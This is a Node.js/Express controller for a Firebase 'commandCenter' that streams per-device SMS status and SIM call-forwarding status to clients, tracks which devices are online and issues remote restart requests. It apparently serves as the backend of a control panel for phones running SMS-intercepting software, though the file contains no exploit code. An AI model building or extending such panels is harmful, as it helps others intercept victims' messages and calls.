import { rtdb } from "../config/db.js";

const ROOT = "commandCenter";

/* ============================================================
      GLOBAL LIVE WATCHER MAPS
============================================================= */
const smsWatchers = new Map();
const simWatchers = new Map();

/* ============================================================
      UTILITY — STOP WATCHER
============================================================= */
function stopWatcher(map, uid) {
  if (map.has(uid)) {
    map.get(uid).off();
    map.delete(uid);
    console.log("🛑 Watcher stopped:", uid);
  }
}

/* ============================================================
      ⭐ LIVE WATCHER: SMS STATUS
      RTDB PATH: commandCenter/smsStatus/{uid}
      SOCKET EVENT: smsStatusUpdate
============================================================= */
function startSmsWatcher(uid, io) {
  const ref = rtdb.ref(`${ROOT}/smsStatus/${uid}`);

  ref.on("value", (snap) => {
    if (!snap.exists()) {
      io.emit("smsStatusUpdate", {
        uid,
        success: true,
        data: [],
        message: "No SMS logs found",
      });
      return;
    }

    const raw = snap.val();
    const list = [];

    Object.entries(raw).forEach(([smsId, obj]) => {
      list.push({
        smsId,
        uid,
        ...obj,
      });
    });

    list.sort((a, b) => b.at - a.at);

    io.emit("smsStatusUpdate", {
      uid,
      success: true,
      data: list,
    });

    console.log("📡 LIVE SMS STATUS →", uid);
  });

  smsWatchers.set(uid, ref);
  console.log("🎧 SMS watcher active:", uid);
}

/* ============================================================
      ⭐ LIVE WATCHER: SIM FORWARD
      RTDB PATH: simForwardStatus/{uid}
      SOCKET EVENT: simForwardUpdate
============================================================= */
function startSimWatcher(uid, io) {
  const ref = rtdb.ref(`simForwardStatus/${uid}`);

  ref.on("value", (snap) => {
    if (!snap.exists()) {
      io.emit("simForwardUpdate", {
        uid,
        success: true,
        data: [],
        message: "No SIM forward status found",
      });
      return;
    }

    const raw = snap.val();
    const list = [];

    Object.entries(raw).forEach(([slot, obj]) => {
      list.push({
        simSlot: Number(slot),
        ...obj,
      });
    });

    list.sort((a, b) => b.updatedAt - a.updatedAt);

    io.emit("simForwardUpdate", {
      uid,
      success: true,
      data: list,
    });

    console.log("📡 LIVE SIM FORWARD →", uid);
  });

  simWatchers.set(uid, ref);
  console.log("🎧 SIM watcher active:", uid);
}

/* ============================================================
   ⭐ GET SMS STATUS — snapshot + start live
============================================================= */
export const getSmsStatusByDevice = async (req, res) => {
  try {
    const { uid } = req.params;
    const io = req.app.get("io");

    // stop old watcher
    stopWatcher(smsWatchers, uid);

    // snapshot
    const snap = await rtdb.ref(`${ROOT}/smsStatus/${uid}`).get();
    let list = [];

    if (snap.exists()) {
      Object.entries(snap.val()).forEach(([smsId, obj]) =>
        list.push({ smsId, uid, ...obj })
      );
      list.sort((a, b) => b.at - a.at);
    }

    // start live watch
    startSmsWatcher(uid, io);

    return res.json({
      success: true,
      data: list,
      message: "Live SMS status listening started",
    });

  } catch (err) {
    console.error("❌ getSmsStatusByDevice ERROR:", err);
    return res.status(500).json({ success: false });
  }
};

/* ============================================================
   ⭐ GET SIM FORWARD STATUS — snapshot + live
============================================================= */
export const getSimForwardStatus = async (req, res) => {
  try {
    const { uid } = req.params;
    const io = req.app.get("io");

    // stop old watcher
    stopWatcher(simWatchers, uid);

    // snapshot
    const snap = await rtdb.ref(`simForwardStatus/${uid}`).get();
    let list = [];

    if (snap.exists()) {
      Object.entries(snap.val()).forEach(([slot, obj]) =>
        list.push({
          simSlot: Number(slot),
          ...obj,
        })
      );
      list.sort((a, b) => b.updatedAt - a.updatedAt);
    }

    // start live watch
    startSimWatcher(uid, io);

    return res.json({
      success: true,
      data: list,
      message: "Live SIM forward listening started",
    });

  } catch (err) {
    console.error("❌ getSimForwardStatus ERROR:", err);
    return res.status(500).json({ success: false });
  }
};

/* ============================================================
   ⭐ CHECK ONLINE STATUS (same as before)
============================================================= */
export const saveCheckOnlineStatus = async (req, res) => {
  try {
    const { uid } = req.params;
    const { available } = req.body;

    const checkedAt = Date.now();
    const data = {
      available: available || "checking",
      checkedAt,
    };

    await rtdb.ref(`checkOnline/${uid}`).set(data);

    return res.json({
      success: true,
      message: "Check Online Updated",
      data: { uid, ...data },
    });

  } catch (err) {
    console.error("❌ saveCheckOnlineStatus ERROR:", err);
    return res.status(500).json({ success: false });
  }
};


/* ============================================================
   ⭐ GET ALL ONLINE REPLIES (FOR ACTIVE BADGE)
   ✅ Fix: Sirf online aur last 15 min wale devices
============================================================= */
export const getAllBrosReplies = async (req, res) => {
  try {
    console.log("📡 [GET] /api/brosreply-all called");
    
    const snap = await rtdb.ref(`checkOnline`).get();
    const data = snap.exists() ? snap.val() : null;
    
    console.log("📡 Raw checkOnline data from Firebase:", data);

    const now = Date.now();
    const fifteenMinutesAgo = now - (15 * 60 * 1000);
    
    const activeDevices = {};
    let activeCount = 0;
    
    if (data && typeof data === 'object') {
      Object.entries(data).forEach(([uid, deviceData]) => {
        if (!deviceData || typeof deviceData !== 'object') {
          console.log(`❌ ${uid}: Invalid device data`);
          return;
        }
        
        const checkedAt = deviceData.checkedAt || deviceData.timestamp || 0;
        const available = String(deviceData.available || "").toLowerCase().trim();
        
        console.log(`📊 ${uid}: available="${available}", checkedAt=${checkedAt}`);
        
        // ✅ CONDITION 1: Must be "device is online"
        const isOnline = available.includes("device is online");
        
        // ✅ CONDITION 2: Must be within last 15 minutes
        const isRecent = Number(checkedAt) > fifteenMinutesAgo;
        
        if (isOnline && isRecent) {
          activeDevices[uid] = { 
            uid, 
            ...deviceData,
            lastSeen: checkedAt,
            isActive: true
          };
          activeCount++;
          console.log(`✅ ADDED ${uid} to active devices`);
        } else {
          console.log(`❌ SKIPPED ${uid}: isOnline=${isOnline}, isRecent=${isRecent}`);
        }
      });
    }

    console.log(`📊 Final result: ${activeCount} active devices`);
    
    return res.json({
      success: true,
      data: activeDevices,
      count: activeCount,
      timestamp: now,
      fifteenMinutesAgo: fifteenMinutesAgo,
      message: `Found ${activeCount} active devices in last 15 minutes`
    });

  } catch (err) {
    console.error("❌ getAllBrosReplies ERROR:", err);
    return res.status(500).json({ 
      success: false, 
      message: "Internal server error",
      error: err.message 
    });
  }
};

/* ============================================================
   ⭐ GET ONLINE REPLY
============================================================= */
export const getBrosReply = async (req, res) => {
  try {
    const { uid } = req.params;

    const snap = await rtdb.ref(`checkOnline/${uid}`).get();
    const data = snap.exists() ? snap.val() : null;

    return res.json({
      success: true,
      data: data ? { uid, ...data } : null,
    });

  } catch (err) {
    console.error("❌ getBrosReply ERROR:", err);
    return res.status(500).json({ success: false });
  }
};

/* ============================================================
   ⭐ RESTART SET + GET (same)
============================================================= */
export const setRestart = async (req, res) => {
  try {
    const { uid } = req.params;

    const at = Date.now();
    const data = {
      requested: true,
      at,
    };

    await rtdb.ref(`restartCollection/${uid}`).set(data);

    return res.json({
      success: true,
      data: { uid, ...data },
    });

  } catch (err) {
    console.error("❌ setRestart ERROR:", err);
    return res.status(500).json({ success: false });
  }
};

export const getDevicePermissions = async (req, res) => {
  try {
    const { uid } = req.params;

    const snap = await rtdb.ref(`registeredDevices/${uid}/permissions`).get();
    const data = snap.exists() ? snap.val() : null;

    return res.json({
      success: true,
      data: data ? { uid, ...data } : null,
      message: data ? "Permissions fetched successfully" : "No permissions found for this device",
    });

  } catch (err) {
    console.error("❌ getDevicePermissions ERROR:", err);
    return res.status(500).json({ success: false });
  }
};

export const getRestart = async (req, res) => {
  try {
    const { uid } = req.params;

    const snap = await rtdb.ref(`restartCollection/${uid}`).get();
    const data = snap.exists() ? snap.val() : null;

    return res.json({
      success: true,
      data: data ? { uid, ...data } : null,
    });

  } catch (err) {
    console.error("❌ getRestart ERROR:", err);
    return res.status(500).json({ success: false });
  }
};
